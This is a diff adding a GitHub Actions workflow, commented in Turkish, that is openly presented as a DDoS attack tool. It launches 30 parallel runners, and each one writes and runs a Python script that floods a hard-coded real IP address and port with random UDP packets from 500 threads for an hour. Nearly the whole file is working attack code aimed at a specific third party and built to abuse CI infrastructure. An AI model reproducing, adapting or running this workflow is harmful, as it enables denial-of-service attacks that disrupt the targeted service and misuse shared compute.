@@ -1,0 +1,65 @@
+# MODIE tarafından Python betiği ile güçlendirilmiş, hedefe kilitli GitHub Actions saldırı aracı
+
+name: LAUNCH PYTHON-POWERED ATTACK
+
+on:
+  workflow_dispatch: # Sadece manuel tetikleme
+
+jobs:
+  python_ddos_attack:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        # 30 paralel sanal makine, her biri yüzlerce iş parçacığı çalıştıracak.
+        # Bu, saldırı gücünü katlayarak artırır.
+        job_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
+
+    steps:
+    - name: Adım 1: Python Saldırı Betiğini Oluştur
+      id: create_script
+      run: |
+        # 'cat' komutu ile çok satırlı Python betiğini dinamik olarak bir dosyaya yazıyoruz.
+        # Bu sayede betik, doğrudan workflow'un içinde yaşar.
+        cat <<'EOF' > udp_attack.py
+        import socket
+        import threading
+        import random
+        import time
+
+        # --- HEDEF BİLGİLERİ (Doğrudan Ayarlandı) ---
+        target_ip = "87.248.157.5"
+        target_port = 9987
+        # ---------------------------------------------
+
+        print(f"[+] Runner ID: ${{ matrix.job_id }} | Hedef: {target_ip}:{target_port}")
+        time.sleep(1)
+
+        # 4KB'lık veri paketi oluştur
+        packet_data = random._urandom(4096) 
+
+        def attack():
+            while True:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    s.sendto(packet_data, (target_ip, target_port))
+                    s.close()
+                except:
+                    pass
+
+        print(f"[+] Runner ID: ${{ matrix.job_id }} | 500 iş parçacığı hazırlanıyor...")
+
+        # 500 iş parçacığı ile saldırıyı başlat
+        for i in range(500):
+            thread = threading.Thread(target=attack)
+            thread.daemon = True # Arka planda çalışmasını sağla
+            thread.start()
+
+        print(f"[+] Runner ID: ${{ matrix.job_id }} | SALDIRI BAŞLATILDI. İşlem devam ediyor...")
+        
+        # GitHub action'ının hemen bitmemesi ve saldırının devam etmesi için 1 saat bekle
+        time.sleep(3600)
+        EOF
+
+    - name: Adım 2: SALDIRIYI BAŞLAT
+      run: python3 udp_attack.py
